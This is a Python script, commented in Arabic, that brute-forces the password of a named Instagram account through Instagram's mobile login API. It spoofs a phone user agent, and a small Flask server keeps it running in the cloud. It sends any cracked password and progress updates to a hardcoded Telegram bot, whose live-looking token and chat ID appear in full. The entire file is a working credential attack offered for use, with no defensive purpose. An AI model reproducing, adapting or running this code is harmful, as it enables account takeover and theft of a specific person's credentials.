import os
import time
import string
import itertools
import requests
from threading import Thread
from flask import Flask # خادم صغير لإبقاء الأداة مستيقظة

# --- إعدادات السيطرة ---
TOKEN = "7139085930:AAFiuRz8byifbAhY11fIYytb5rbmDs_P8WU"
ID = "7389630010"
TARGET = "s.un.g1" # اليوزر المستهدف

app = Flask(__name__)

@app.route('/')
def home():
    return "SERVER IS ALIVE - ATTACK IN PROGRESS"

def send_telegram(message):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    requests.post(url, json={"chat_id": ID, "text": message})

def attack_engine():
    attempts = 0
    # المولد الشامل: أرقام + حروف + رموز
    chars = string.ascii_letters + string.digits + "._"
    
    send_telegram(f"🚀 Started Cloud Attack on: {TARGET}")
    
    for length in range(6, 13):
        for p in itertools.product(chars, repeat=length):
            password = "".join(p)
            attempts += 1
            
            try:
                # محاكاة هاتف Redmi 14C للسيرفر
                headers = {'User-Agent': 'Instagram 315.0.0.35.109 Android (33/13; Xiaomi; 2409BRN2CG)'}
                res = requests.post(
                    "https://i.instagram.com/api/v1/accounts/login/",
                    data={'username': TARGET, 'password': password},
                    headers=headers, timeout=10
                ).json()

                if 'logged_in_user' in res:
                    send_telegram(f"🎯 TARGET CRACKED!\nUser: {TARGET}\nPass: {password}\nAttempts: {attempts}")
                    return

                # تقرير كل 5000 محاولة لكي لا يحظر تليجرام البوت
                if attempts % 5000 == 0:
                    print(f"Cloud Status: {attempts} attempts reached...")
            except:
                time.sleep(2) # انتظار في حال حدوث خطأ في الشبكة
                continue

def run_web_server():
    # تشغيل الخادم على المنفذ الذي تحدده المنصة (غالباً 10000)
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)

if __name__ == "__main__":
    # تشغيل الهجوم في خيط منفصل
    t = Thread(target=attack_engine)
    t.start()
    
    # تشغيل خادم الويب في الخيط الرئيسي
    run_web_server()
  
